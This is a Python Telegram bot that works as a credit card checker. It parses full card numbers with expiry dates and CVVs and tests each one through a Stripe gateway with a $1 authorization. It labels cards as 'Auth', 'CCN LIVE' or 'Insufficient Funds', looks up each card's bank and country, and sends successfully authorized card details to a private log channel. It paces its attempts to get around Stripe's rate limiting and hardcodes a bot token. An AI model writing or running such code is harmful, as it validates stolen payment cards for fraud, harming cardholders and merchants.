import requests
import telebot, time, re, json, os
from telebot import types
from gatet import Tele

# ================= BOT TOKEN =================
token = '7767698545:AAGElWiWhfPEuuvRryKLyavgAQIs_6PNwRo'
bot = telebot.TeleBot(token, parse_mode="HTML")

# ================= LOG CHANNEL =================
LOG_CHANNEL = -1003871702658  # သင့် Telegram channel ID ထည့်ပါ

# ================= OWNER =================
OWNER_ID = 7415233736  # ကိုယ့် Telegram ID ထည့်ပါ

def guard_owner(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this bot.")
        return False
    return True

# ================= BIN INFO =================
def get_bin_info(cc):
    try:
        bin_num = cc[:6]
        res = requests.get(f'https://bins.antipublic.cc/bins/{bin_num}', timeout=5)
        if res.status_code == 200:
            data = res.json()
            return {
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'country': data.get('country_name', 'Unknown'),
                'flag': data.get('country_flag', '🏁'),
                'bank': data.get('bank', 'Unknown')
            }
    except:
        pass
    return {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🏁', 'bank': 'Unknown'}

# ================= LOG AUTH ONLY =================
def log_Auth_only(message, result_text, full_message):
    try:
        if not result_text:
            return

        t = result_text.lower()

        # Auth ပါရင်ပဲ log ပို့မယ်
        if "auth" in t:
            bot.send_message(
                LOG_CHANNEL,
                full_message,
                parse_mode="HTML",
                disable_web_page_preview=True
            )

    except Exception as e:
        print("AUTH LOG ERROR:", e)
# ================= START COMMAND =================
@bot.message_handler(commands=["start"])
def start(message):
    if not guard_owner(message):
        return
    welcome_msg = (
        f"👋 <b>Welcome!</b>\n\n"
        f"👤 <b>User ID:</b> <code>{message.from_user.id}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"Use <code>/chk card</code> to check cards."
    )
    bot.reply_to(message, welcome_msg)

# ================= CHECK COMMAND =================
@bot.message_handler(commands=["chk"])
def chk_handler(message):
    if not guard_owner(message):
        return

    username = message.from_user.username
    checker_name = f"@{username}" if username else message.from_user.first_name

    input_text = message.text
    cards = re.findall(r'\d{15,16}[\s|:/]\d{1,2}[\s|:/]\d{2,4}[\s|:/]\d{3,4}', input_text)

    if not cards:
        bot.reply_to(message, "❌ <b>No valid cards found!</b>")
        return

    cc_to_check = [re.sub(r'[\s:/]+', '|', c) for c in cards[:1]]

    header = "⚡ GATEWAY ➼ STRIPE $1\n\n"
    msg = bot.reply_to(message, "⏳ <b>Processing Request...</b>")

    results_list = [None] * len(cc_to_check)

    for i in range(len(cc_to_check)):
        current_cc = cc_to_check[i]
        bin_data = get_bin_info(current_cc)
        start_time = time.time()

        try:
            res_raw = str(Tele(current_cc))
            if "succeeded" in res_raw:
                result = "Auth ✅"
            elif "insufficient funds" in res_raw:
                result = "Insufficient Funds 🔥"
            elif "incorrect_cvc" in res_raw:
                result = "CCN LIVE ✅"
            elif "requires_action" in res_raw:
                result = "3Ds (Requires Action) 🛡️"
            elif "you cannot add a new payment method so soon after the previous one" in res_raw:
                result = "Rate Limited ⏳"
                time.sleep(10)   # 10 sec စော
            else:
                result = res_raw if res_raw else "DECLINED ❌"
                time.sleep(10)
        except Exception as e:
            result = "Error ⚠️"

        # Log charged only
        log_Auth_only(
            message,
            result,
            f"<b>Card:</b> <code>{current_cc}</code>\n<b>Status:</b> {result}"
        )

        # Execution time
        exec_time = round(time.time() - start_time, 2)

        # Save result
        results_list[i] = (
            f"💳 <b>Card:</b> <code>{current_cc}</code>\n"
            f"💬 <b>Response:</b> <b>{result}</b>\n"
            f"ℹ️ <b>Info:</b> {bin_data['brand'].upper()} - {bin_data['type'].upper()}\n"
            f"🏦 <b>Bank:</b> {bin_data['bank'].upper()}\n"
            f"🌍 <b>Country:</b> {bin_data['country'].upper()} {bin_data['flag']}\n"
            f"⏱️ <b>Time:</b> {exec_time}s\n"
            f"━━━━━━━━━━━━━━"
        )

        # Update progress display
        display_text = header
        for j in range(len(cc_to_check)):
            if results_list[j]:
                display_text += results_list[j] + "\n"
            elif i == j:
                display_text += f"<code>{cc_to_check[j]}</code>\nChecking...\n\n"
            else:
                display_text += f"<code>{cc_to_check[j]}</code>\nWaiting...\n\n"
        display_text += f"👤 <b>Checker:</b> {checker_name}"

        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=display_text)
        except:
            pass

        time.sleep(30)

    # Final display
    final_display = header
    for res in results_list:
        final_display += res + "\n"
    final_display += f"\n👤 <b>Checker:</b> {checker_name}"

    try:
        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=final_display)
    except:
        pass

# ================= MAIN LOOP =================
if __name__ == "__main__":
    print("Bot is running...")

    # ✅ Bot start ဖြစ်ချိန် channel ကို test message ပို့မယ်
    try:
        bot.send_message(
            LOG_CHANNEL,
            "✅ Bot Started Successfully!"
        )
    except Exception as e:
        print("Channel send error:", e)

    while True:
        try:
            bot.polling(non_stop=True)
        except Exception as e:
            time.sleep(10)
